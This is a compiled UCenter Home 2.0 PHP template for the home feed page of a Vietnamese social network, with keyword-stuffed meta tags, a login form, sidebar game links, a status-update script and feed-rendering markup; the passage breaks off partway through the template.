<?php if(!defined('IN_UCHOME')) exit('Access Denied');?><?php subtplcheck('template/default/space_feed|template/default/header|template/default/space_status|template/default/space_menu|template/default/space_feed_li|template/default/space_feed_li|template/default/space_feed_li|template/default/footer', '1315016237', 'template/default/space_feed');?><?php if(empty($_TPL['getmore'])) { ?>	
<?php $_TPL['titles'] = array('Home'); ?>
<?php if(empty($_SGLOBAL['inajax'])) { ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=<?=$_SC['charset']?>" />
<meta http-equiv="x-ua-compatible" content="ie=7" />
<title><?php if($_TPL['titles']) { ?><?php if(is_array($_TPL['titles'])) { foreach($_TPL['titles'] as $value) { ?><?php if($value) { ?><?=$value?> - <?php } ?><?php } } ?><?php } ?><?php if($_SN[$space['uid']]) { ?><?=$_SN[$space['uid']]?> - <?php } ?><?=$_SCONFIG['sitename']?> - Powered by UCenter Home 2.0 - Hỗ trợ GoHooH.CoM</title>
<meta name="keywords" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta name="description" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta http-equiv="EXPIRES" content="0" />
<meta name="RESOURCE-TYPE" content="DOCUMENT" />
<meta name="DISTRIBUTION" content="GLOBAL" />
<meta name="AUTHOR" content="Saokim999" />
<meta name="robots" content="index, follow" />
<meta name="revisit-after" content="1 days">
<script language="javascript" type="text/javascript" src="source/script_cookie.js"></script>
<script language="javascript" type="text/javascript" src="source/script_common.js"></script>
<script language="javascript" type="text/javascript" src="source/script_menu.js"></script>
<script language="javascript" type="text/javascript" src="source/script_ajax.js"></script>
<script language="javascript" type="text/javascript" src="source/script_face.js"></script>
<script language="javascript" type="text/javascript" src="source/script_manage.js"></script>
<script src="upmudim.js" type="text/javascript"></script>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
<script type="text/javascript">
try {
_uacct = "UA-4097706-3";
urchinTracker();
} catch(err) {}</script>
<style type="text/css">
@import url(template/default/style.css);
<?php if($_TPL['css']) { ?>
@import url(template/default/<?=$_TPL['css']?>.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_theme'])) { ?>
@import url(theme/<?=$_SGLOBAL['space_theme']?>/style.css);
<?php } elseif($_SCONFIG['template'] != 'default') { ?>
@import url(template/<?=$_SCONFIG['template']?>/style.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_css'])) { ?>
<?=$_SGLOBAL['space_css']?>
<?php } ?>
</style>
<link rel="shortcut icon" href="image/favicon.ico" />
<link rel="edituri" type="application/rsd+xml" title="rsd" href="xmlrpc.php?rsd=<?=$space['uid']?>" />
</head>
<body>

<div id="append_parent"></div>
<div id="ajaxwaitid"></div>
<div id="header">
<?php if($_SGLOBAL['ad']['header']) { ?><div id="ad_header"><?php adshow('header'); ?></div><?php } ?>
<div class="headerwarp">
<h1 class="logo"><a href="http://gohooh.com"><img src="template/<?=$_SCONFIG['template']?>/image/logo.gif" alt="<?=$_SCONFIG['sitename']?>" /></a></h1>
<ul class="menu">
<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=home">Trang chủ</a></li>
<li><a href="space.php">Trang cá nhân</a></li>
<li><a href="space.php?do=friend">Bạn bè</a></li>
<li><a href="network.php">Cộng đồng</a></li>
                <?php } else { ?>
<li><a href="index.php">Trang chính</a></li>
<?php } ?>

<?php if($_SGLOBAL['appmenu']) { ?>
<?php if($_SGLOBAL['appmenus']) { ?>
<li class="dropmenu" id="ucappmenu" onclick="showMenu(this.id)">
<a href="javascript:;">Site Menu</a>
</li>
<?php } else { ?>
<li><a target="_blank" href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php } ?>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=pm<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>&filter=newpm<?php } ?>">Tin nhắn<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>(Mới)<?php } ?></a></li>
<?php if($_SGLOBAL['member']['allnotenum']) { ?><li class="notify" id="membernotemenu" onmouseover="showMenu(this.id)"><a href="space.php?do=notice"><?=$_SGLOBAL['member']['allnotenum']?>Một thông điệp</a></li><?php } ?>
<?php } else { ?>
<li><a href="help.php">Trợ giúp</a></li>
<?php } ?>
</ul>

<div class="nav_account">
<?php if($_SGLOBAL['supe_uid']) { ?>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="loginName"><?=$_SN[$_SGLOBAL['supe_uid']]?></a>
<?php if($_SGLOBAL['member']['credit']) { ?>
<a href="cp.php?ac=credit" style="font-size:11px;padding:0 0 0 5px;"><img src="image/credit.gif"><?=$_SGLOBAL['member']['credit']?></a>
<?php } ?>
<br />
<?php if(empty($_SCONFIG['closeinvite'])) { ?>
<a href="cp.php?ac=invite">Mời</a> 
<?php } ?>
<a href="cp.php?ac=task">Task</a> 
<a href="cp.php?ac=magic">Thẻ Vip</a>
<a href="cp.php">CP</a> 
<a href="cp.php?ac=common&op=logout&uhash=<?=$_SGLOBAL['uhash']?>">Thoát</a>
<?php } else { ?>
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
Welcome<br>
<a href="do.php?ac=<?=$_SCONFIG['login_action']?>">Đăng nhập</a> | 
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>">Đăng ký</a>
<?php } ?>
</div>
</div>
</div>

<div id="wrap">

<?php if(empty($_TPL['nosidebar'])) { ?>
<div id="main">
<div id="app_sidebar">
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul class="app_list" id="default_userapp">
<li><img src="image/app/doing.gif"><a href="space.php?do=doing">Status</a></li>
<li><img src="image/app/album.gif"><a href="space.php?do=album">Album</a><em><a href="cp.php?ac=upload" class="gray">Upload</a></em></li>
<li><img src="image/app/blog.gif"><a href="space.php?do=blog">Blogs</a><em><a href="cp.php?ac=blog" class="gray">Viết</a></em></li>
<li><img src="image/app/poll.gif"/><a href="space.php?do=poll">Poll</a><em><a href="cp.php?ac=poll" class="gray">Bình chọn</a></em></li>
<li><img src="image/app/mtag.gif"><a href="space.php?do=mtag">Group</a><em><a href="cp.php?ac=thread" class="gray">Tạo</a></em></li>
<li><img src="image/app/event.gif"/><a href="space.php?do=event">Event</a><em><a href="cp.php?ac=event" class="gray">Bắt đầu</a></em></li>
<li><img src="image/app/share.gif"><a href="space.php?do=share">Share</a></li>
<li><img src="image/app/topic.gif"><a href="space.php?do=topic">Topic</a></li>
<li><img src="image/app/farm.gif"><a href="qqfarm.php">Nông trại</a></li>
<li><img src="image/app/fish.gif"><a href="fish.php">Ao cá</a></li>
<li><img src="image/app/love.gif"><a href="house.php">Hạnh phúc</a></li>
<li><img src="image/app/clxj.gif"><a href="clxj.php">Audition</a></li>
<li><img src="image/app/thinhthay.jpg"><a href="thayboi.php">Thầy bói</a></li>
<li><img src="image/app/blq.gif"><a href="blq.php">Bowling</a></li>
<li><img src="image/app/daovang.gif"><a href="daovang.php">Đào vàng</a></li>
<li><img src="image/app/gohoohhungtrung.gif"><a href="gohoohhungtrung.php">Hứng trứng</a></li>
<li><img src="image/app/duluong.gif"><a href="duluong.php">Dù lượng</a></li>
<li><img src="image/app/dapthu.gif"><a href="dapthu.php">Đập thú</a></li>
<li><img src="image/app/bangau.gif"><a href="bangau.php">Trượt tuyết</a></li>
<li><img src="image/app/xeptraicay.gif"><a href="xeptraicay.php">Xếp trái cây</a></li>
<li><img src="image/app/thamhiem.gif"><a href="thamhiem.php">Thám hiểm</a></li>
</ul>

<ul class="app_list topline" id="my_defaultapp">
<?php if($_SCONFIG['my_status']) { ?>
<?php if(is_array($_SGLOBAL['userapp'])) { foreach($_SGLOBAL['userapp'] as $value) { ?>
<li><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>"><?=$value['appname']?></a></li>
<?php } } ?>
<?php } ?>
</ul>

<?php if($_SCONFIG['my_status']) { ?>
<ul class="app_list topline" id="my_userapp">
<?php if(is_array($_SGLOBAL['my_menu'])) { foreach($_SGLOBAL['my_menu'] as $value) { ?>
<li id="userapp_li_<?=$value['appid']?>"><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>" title="<?=$value['appname']?>"><?=$value['appname']?></a></li>
<?php } } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['my_menu_more']) { ?>
<p class="app_more"><a href="javascript:;" id="a_app_more" onclick="userapp_open();" class="off">Mở rộng</a></p>
<?php } ?>

<?php if($_SCONFIG['my_status']) { ?>
<div class="app_m">
<ul>
<li><img src="image/app_add.gif"><a href="cp.php?ac=userapp&my_suffix=%2Fapp%2Flist" class="addApp">Thêm ứng dụng</a></li>
<li><img src="image/app_set.gif"><a href="cp.php?ac=userapp&op=menu" class="myApp">Quản lý Apps</a></li>
</ul>
</div>
<?php } ?>

<?php } else { ?>
<div class="bar_text">
<form id="loginform" name="loginform" action="do.php?ac=<?=$_SCONFIG['login_action']?>&ref" method="post">
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>" />
<p class="title">Đăng nhập Web</p>
<p>User name</p>
<p><input type="text" name="username" id="username" class="t_input" size="15" value="" /></p>
<p>Password</p>
<p><input type="password" name="password" id="password" class="t_input" size="15" value="" /></p>
<p><input type="checkbox" id="cookietime" name="cookietime" value="315360000" checked /><label for="cookietime">Nhớ mật khẩu</label></p>
<p>
<input type="submit" id="loginsubmit" name="loginsubmit" value="Đăng nhập" class="submit" />
<input type="button" name="regbutton" value="Đăng ký" class="button" onclick="urlto('do.php?ac=<?=$_SCONFIG['register_action']?>');">
</p>
</form>
</div>
<?php } ?>
</div>

<div id="mainarea">

<?php if($_SGLOBAL['ad']['contenttop']) { ?><div id="ad_contenttop"><?php adshow('contenttop'); ?></div><?php } ?>
<?php } ?>

<?php } ?>


<div id="content">

<?php if($space['uid'] && $space['self']) { ?>
<table cellpadding="0" cellspacing="0" border="0" width="100%">
<tr>
<td valign="top" width="150">
<div class="ar_r_t"><div class="ar_l_t"><div class="ar_r_b"><div class="ar_l_b"><?php echo avatar($_SGLOBAL[supe_uid],middle); ?></div></div></div></div>

<ul class="u_setting">
<li class="dropmenu" id="usettingli" onclick="showMenu(this.id)"><a href="javascript:;">My Setting <img src="image/more.gif" align="absmiddle"></a></li>
</ul>
<ul id="usettingli_menu" class="dropmenu_drop" style="display:none;">
<li><a href="cp.php?ac=avatar">Change Avatar</a></li>
<li><a href="cp.php?ac=profile">Edit Profile</a></li>
<li><a href="cp.php?ac=theme">Change Theme</a></li>
<li><a href="cp.php?ac=credit">My Points</a></li>
<?php if($_SCONFIG['sendmailday']) { ?>
<li><a href="cp.php?ac=sendmail">Email Remind</a></li>
<?php } ?>
<li><a href="cp.php?ac=privacy">Set Privacy</a></li>
<?php if(checkperm('admin')) { ?>
<li><a href="admincp.php">CP</a></li>
<?php } ?>
<?php if(checkperm('allowstat')) { ?>
<li><a href="do.php?ac=stat">Statistics</a></li>
<?php } ?>
</ul>
</td>
<td valign="top">
<h3 class="index_name">
<div class="r_option">
<?php if($_SGLOBAL['session']['magichidden']) { ?>Invisible<?php } else { ?>Now Online<?php } ?>

<?php if($_SGLOBAL['magic']['invisible']) { ?>
<?php if($_SGLOBAL['session']['magichidden']) { ?>
<img src="image/magic/invisible.small.gif" class="magicicon"><a id="a_magic_appear" href="cp.php?ac=magic&op=appear" onclick="ajaxmenu(event,this.id)" class="gray">Show me online</a>
<?php } else { ?>
<img src="image/magic/invisible.small.gif" alt="<?=$_SGLOBAL['magic']['invisible']?>" class="magicicon"><a id="a_magic_invisible" href="magic.php?mid=invisible" onclick="ajaxmenu(event,this.id,1)" class="gray">Take me Offline</a>
<?php } ?>
<?php } ?>
</div>

<a href="space.php?uid=<?=$space['uid']?>"<?php g_color($space[groupid]); ?>><?=$_SN[$space['uid']]?></a>
<?php g_icon($space[groupid]); ?>
<a href="cp.php?ac=credit"><?=$space['star']?></a>
</h3>

<div class="index_note">
Hits <?=$space['viewnum']?>, Points <?=$space['credit']?>,Level <?=$space['experience']?>
</div>

<div id="mood_mystatus">
<?=$space['spacenote']?>
</div>

<div id="mood_form">
<form method="post" action="cp.php?ac=doing" id="mood_addform">
<div id="mood_statusinput" class="statusinput"><textarea name="message" id="mood_message" onclick="statusFace();" onkeydown="if(event.keyCode == 13 ){ event.returnValue=false;event.cancel = true;$('mood_add').click();$('mood_message').value='';this.blur(); };" >Cập nhập cảm xúc, trạng thái, tin nhắn!</textarea></div>
<div class="statussubmit">
<input type="button" id="mood_add" name="add" value=">OK<" class="submit" style="display:none;" onclick="ajaxpost('mood_addform', 'reloadMood');$('mood_message').value='';" />
<input type="hidden" name="addsubmit" value="true" />
<input type="hidden" name="spacenote" value="true" />
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>" />
</div>

</form>
</div>


<script type="text/javascript">
function statusFace() {
if($('mood_message').value == 'Cập nhập cảm xúc, trạng thái, tin nhắn!'){
$('mood_message').value = '';
}
$('mood_statusinput').style.zIndex = '20005';
$('mood_statusinput').className = 'statusinput2';
$('mood_add').style.display = 'block';


var div = $('mood_face_bg');
if(div) {
div.parentNode.removeChild(div);
}
div = document.createElement('div');
div.id = 'mood_face_bg';
div.style.position = 'absolute';
div.style.left = div.style.top = '0px';
div.style.width = '100%';
div.style.height = document.body.scrollHeight + 'px';
div.style.backgroundColor = '#000';
div.style.zIndex = 10000;
div.style.display = 'none';
div.style.filter = 'alpha(opacity=0)';
div.style.opacity = 0;
div.onclick = function() {
hiddenstatus();
}
$('append_parent').appendChild(div);


if($('mood_message_menu') != null) {
$('mood_message_menu').style.display = '';
$('mood_add').style.display = '';
} else {
var faceDiv = document.createElement("div");
faceDiv.id = 'mood_message_menu';
faceDiv.className = 'facebox';
faceDiv.style.position = 'absolute';
var faceul = document.createElement("ul");
for(i=1; i<31; i++) {
getStatusFace(i, faceul);	
}
faceDiv.appendChild(faceul);
$('append_parent').appendChild(faceDiv);
}
//¶¨Î»²Ëµ¥
setMenuPosition('mood_message', 0);
div.style.display = '';
}

function hiddenstatus() {
$('mood_message_menu').style.display = 'none';
$('mood_face_bg').style.display = 'none';
$('mood_add').style.display = 'none';
$('mood_statusinput').className = 'statusinput';
if($('mood_message').value == ''){
$('mood_message').value = 'Cập nhập cảm xúc, trạng thái, tin nhắn!';
}
$('mood_statusinput').style.zIndex = '1';
}

function getStatusFace(i, faceul) {
var faceli = document.createElement("li");
faceli.innerHTML = '<img src="image/face/'+i+'.gif" style="cursor:pointer; position:relative;" />';
faceli.getElementsByTagName('img').item(0).onclick = function(){var faceText = '[em:'+i+':]'; if($('mood_message') != null) { insertContent('mood_message', faceText); }};
faceul.appendChild(faceli);
}

function reloadMood(showid, result) {
var x = new Ajax();
x.get('cp.php?ac=doing&op=getmood', function(s){
$('mood_mystatus').innerHTML = s;
});
//ÌáÊ¾»ñµÃ»ý·Ö
showreward();
hiddenstatus();
}
</script>
</td>
</tr>
</table>

<?php if($space['allnum']) { ?>
<div class="mgs_list">
<?php if($space['notenum']) { ?><div><img src="image/icon/notice.gif"><a href="space.php?do=notice"><strong><?=$space['notenum']?></strong> New notice</a></div><?php } ?>
<?php if($space['addfriendnum']) { ?><div><img src="image/icon/friend.gif" alt="" /><a href="cp.php?ac=friend&op=request"><strong><?=$space['addfriendnum']?></strong> friend request</a></div><?php } ?>
<?php if($space['mtaginvitenum']) { ?><div><img src="image/icon/mtag.gif" alt="" /><a href="cp.php?ac=mtag&op=mtaginvite"><strong><?=$space['mtaginvitenum']?></strong> group invitation</a></div><?php } ?>
<?php if($space['eventinvitenum']) { ?><div><img src="image/icon/event.gif" alt="" /><a href="cp.php?ac=event&op=eventinvite"><strong><?=$space['eventinvitenum']?></strong> event invitation</a></div><?php } ?>
<?php if($space['myinvitenum']) { ?><div><img src="image/icon/userapp.gif" alt="" /><a href="space.php?do=notice&view=userapp"><strong><?=$space['myinvitenum']?></strong> Apps info</a></div><?php } ?>
<?php if($space['pmnum']) { ?><div><img src="image/icon/pm.gif" alt="" /><a href="space.php?do=pm"><strong><?=$space['pmnum']?></strong> new PM</a></div><?php } ?>
<?php if($space['pokenum']) { ?><div><img src="image/icon/poke.gif" alt="" /><a href="cp.php?ac=poke"><strong> <?=$space['pokenum']?></strong> new poke</a></div><?php } ?>
<?php if($space['reportnum']) { ?><div><img src="image/icon/report.gif" alt="" /><a href="admincp.php?ac=report"><strong><?=$space['reportnum']?></strong> Abuse</a></div><?php } ?>
<?php if($space['namestatusnum']) { ?><div><img src="image/icon/profile.gif" alt="" /><a href="admincp.php?ac=space&perpage=20&namestatus=0&searchsubmit=1"><strong><?=$space['namestatusnum']?></strong> Verify User</a></div><?php } ?>
<?php if($space['eventverifynum']) { ?><div><img src="image/icon/event.gif" alt="" /><a href="admincp.php?ac=event&perpage=20&grade=0&searchsubmit=1"><strong><?=$space['eventverifynum']?></strong> Verfy Event</a></div><?php } ?>
</div>
<?php } ?>

<?php if($isnewer && $task) { ?>
<div class="ye_r_t"><div class="ye_l_t"><div class="ye_r_b"><div class="ye_l_b">
<div class="task_notice">
<div class="task_notice_body">
<div class="notice">Hello <?=$_SN[$space['uid']]?>, Welcome, There are new tasks waiting for you��quite simple.</div>
<img src="<?=$task['image']?>" alt="" class="icon" />
<h3><a href="cp.php?ac=task&op=do&taskid=<?=$task['taskid']?>"><?=$task['name']?></a></h3>
<p>Available <span class="num"><?=$task['credit']?></span> points</p>
</div>
</div>
</div></div></div></div><br>
<?php } ?>

<?php if(empty($_SCOOKIE['closefeedbox']) && $_SGLOBAL['ad']['feedbox']) { ?>
<div id="feed_box" class="ye_r_t"><div class="ye_l_t"><div class="ye_r_b"><div class="ye_l_b">
<div class="task_notice">
<a title="ignore" class="float_cancel" href="javascript:;" onclick="close_feedbox();">ignore</a>
<div class="task_notice_body">
<?php adshow('feedbox'); ?>
</div>
</div>
</div></div></div></div>
<?php } ?>

<div class="tabs_header" style="padding-top:10px;">

<?php if($_SGLOBAL['magic']['thunder']) { ?>
<a id="a_magic_thunder" href="magic.php?mid=thunder" onclick="ajaxmenu(event,this.id, 1)" class="r_option gray"><img src="image/magic/thunder.small.gif" alt="<?=$_SGLOBAL['magic']['thunder']?>" class="magicicon"><?=$_SGLOBAL['magic']['thunder']?></a>
<?php } ?>

<ul class="tabs">
<?php if($space['friendnum']) { ?><li<?=$actives['we']?>><a href="space.php?do=home&view=we"><span>Friend's Feed</span></a></li><?php } ?>
<li<?=$actives['hot']?>><a href="space.php?do=home&view=hot"><span>Top Recommended</span></a></li>
<li<?=$actives['me']?>><a href="space.php?do=home&view=me"><span>My Feed</span></a></li>
<li<?=$actives['all']?>><a href="space.php?do=home&view=all"><span>All Feed</span></a></li>
</ul>
</div>
<?php } elseif($space['uid']) { ?>

<?php $_TPL['spacetitle'] = "RSS Feed";
	$_TPL['spacemenus'][] = "<a href=\"space.php?uid=$space[uid]&do=feed&view=me\">All Friend's RSS Feed</a>"; ?>
﻿<div class="c_header a_header">
<div class="avatar48"><a href="space.php?uid=<?=$space['uid']?>"><?php echo avatar($space[uid],small); ?></a></div>
<?php if($_SGLOBAL['refer']) { ?>
<a class="r_option" href="<?=$_SGLOBAL['refer']?>">&laquo; Trang trước</a>
<?php } ?>
<p style="font-size:14px"><?=$_SN[$space['uid']]?> <?=$_TPL['spacetitle']?></p>
<a href="space.php?uid=<?=$space['uid']?>" class="spacelink">Trang nhà <?=$_SN[$space['uid']]?></a>
<?php if($_TPL['spacemenus']) { ?>
<?php if(is_array($_TPL['spacemenus'])) { foreach($_TPL['spacemenus'] as $value) { ?> <span class="pipe">&raquo;</span> <?=$value?><?php } } ?>
<?php } ?>
</div>

<?php } ?>

<div class="feed">
<div id="feed_div" class="enter-content">

<?php if($hotlist) { ?>
<a href="space.php?do=home&view=hot" class="r_option">&raquo; view more Top</a>
<h4 class="feedtime" style="margin-top:5px;">Recent Top recommended</h4>
<ul>
<?php if(is_array($hotlist)) { foreach($hotlist as $value) { ?>
<?php $value = mkfeed($value); ?>
<li class="s_clear <?=$value['magic_class']?>" id="feed_<?=$value['feedid']?>_li" onmouseover="feed_menu(<?=$value['feedid']?>,1);" onmouseout="feed_menu(<?=$value['feedid']?>,0);">
<div style="width:100%;overflow:hidden;" <?=$value['style']?>>
<?php if($value['uid'] && empty($_TPL['hidden_more'])) { ?>
<a href="cp.php?ac=feed&op=menu&feedid=<?=$value['feedid']?>" class="float_more" id="a_feed_menu_<?=$value['feedid']?>"  onmouseover="feed_menu(<?=$value['feedid']?>,1);" onmouseout="feed_menu(<?=$value['feedid']?>,0);" onclick="ajaxmenu(event, this.id)" title="More options" style="display:none;">Menu</a>
<?php } ?>
<a class="type" href="space.php?uid=<?=$_GET['uid']?>&do=feed&view=<?=$_GET['view']?>&appid=<?=$value['appid']?>&icon=<?=$value['icon']?>" title="Only such Feed"><img src="<?=$value['icon_image']?>" /></a>
<?=$value['title_template']?> 

<?php if(empty($_TPL['hidden_time'])) { ?>
<span class="gray"><?php echo sgmdate('m-d H:i',$value[dateline],1); ?></span>
<?php } ?>

<?php if(empty($_TPL['hidden_menu'])) { ?>
<?php if($value['idtype']=='doid') { ?>
(<a href="javascript:;" onclick="docomment_get('docomment_<?=$value['id']?>', 1);" id="do_a_op_<?=$value['id']?>">Reply</a>)
<?php } elseif(in_array($value['idtype'], array('blogid','picid','sid','pid','eventid'))) { ?>
(<a href="javascript:;" onclick="feedcomment_get(<?=$value['feedid']?>);" id="feedcomment_a_op_<?=$value['feedid']?>">Comment</a>)
<?php } ?>
<?php } ?>

<div class="feed_content">

<?php if(empty($_TPL['hidden_hot']) && $value['hot']) { ?>
<div class="hotspot"><a href="cp.php?ac=feed&feedid=<?=$value['feedid']?>"><?=$value['hot']?></a></div>
<?php } ?>	

<?php if($value['image_1']) { ?>
<a href="<?=$value['image_1_link']?>"<?=$value['target']?>><img src="<?=$value['image_1']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_2']) { ?>
<a href="<?=$value['image_2_link']?>"<?=$value['target']?>><img src="<?=$value['image_2']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_3']) { ?>
<a href="<?=$value['image_3_link']?>"<?=$value['target']?>><img src="<?=$value['image_3']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_4']) { ?>
<a href="<?=$value['image_4_link']?>"<?=$value['target']?>><img src="<?=$value['image_4']?>" class="summaryimg" /></a>
<?php } ?>

<?php if($value['body_template']) { ?>
<div class="detail"<?php if($value['image_3']) { ?> style="clear: both;"<?php } ?>>
<?=$value['body_template']?>
</div>
<?php } ?>

<?php if($value['thisapp'] && !empty($value['body_data']['flashvar'])) { ?>
<div class="media">
<img src="image/vd.gif" alt="Click to play" onclick="javascript:showFlash('<?=$value['body_data']['host']?>', '<?=$value['body_data']['flashvar']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif($value['thisapp'] && !empty($value['body_data']['musicvar'])) { ?>
<div class="media">
<img src="image/music.gif" alt="Click to play" onclick="javascript:showFlash('music', '<?=$value['body_data']['musicvar']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif($value['thisapp'] && !empty($value['body_data']['flashaddr'])) { ?>
<div class="media">
<img src="image/flash.gif" alt="Click to play" onclick="javascript:showFlash('flash', '<?=$value['body_data']['flashaddr']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } ?>

<?php if($value['body_general']) { ?>
<div class="quote"><span class="q"><?=$value['body_general']?></span></div>
<?php } ?>
</div>
</div>

<?php if($value['idtype']=='doid') { ?>
<div id="docomment_<?=$value['id']?>" style="display:none;"></div>
<?php } elseif($value['idtype']) { ?>
<div id="feedcomment_<?=$value['feedid']?>" style="display:none;"></div>
<?php } ?>

<?php if(!empty($hiddenfeed_num[$value['icon']])) { ?>
<div id="appfeed_open_<?=$value['feedid']?>"><a href="javascript:;" id="feed_a_more_<?=$value['feedid']?>" onclick="feed_more_show('<?=$value['feedid']?>');">&raquo;  More Feed (<?=$hiddenfeed_num[$value['icon']]?>)</a></div>
<div id="feed_more_<?=$value['feedid']?>" style="display:none;">
<ol>
<?php if(is_array($hiddenfeed_list[$value['icon']])) { foreach($hiddenfeed_list[$value['icon']] as $appvalue) { ?>
<?php $appvalue = mkfeed($appvalue); ?>
<li>
<?=$appvalue['title_template']?>
<div class="feed_content" style="width:100%;overflow:hidden;">
<?php if($appvalue['image_1']) { ?>
<a href="<?=$appvalue['image_1_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_1']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_2']) { ?>
<a href="<?=$appvalue['image_2_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_2']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_3']) { ?>
<a href="<?=$appvalue['image_3_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_3']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_4']) { ?>
<a href="<?=$appvalue['image_4_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_4']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['body_template']) { ?>
<div class="detail"<?php if($appvalue['image_3']) { ?> style="clear: both;"<?php } ?>>
<?=$appvalue['body_template']?>
</div>
<?php } ?>
<?php if($appvalue['body_general']) { ?>
<div class="quote"><span class="q"><?=$appvalue['body_general']?></span></div>
<?php } ?>
</div>
</li>
<?php } } ?>
</ol>
</div>
<?php } ?>
</li>
<?php } } ?>
</ul>
<?php } ?>

<?php } ?>	

<?php if($list) { ?>
<?php if(is_array($list)) { foreach($list as $day => $values) { ?>
<?php if($_GET['view']!='hot') { ?>
<h4 class="feedtime">
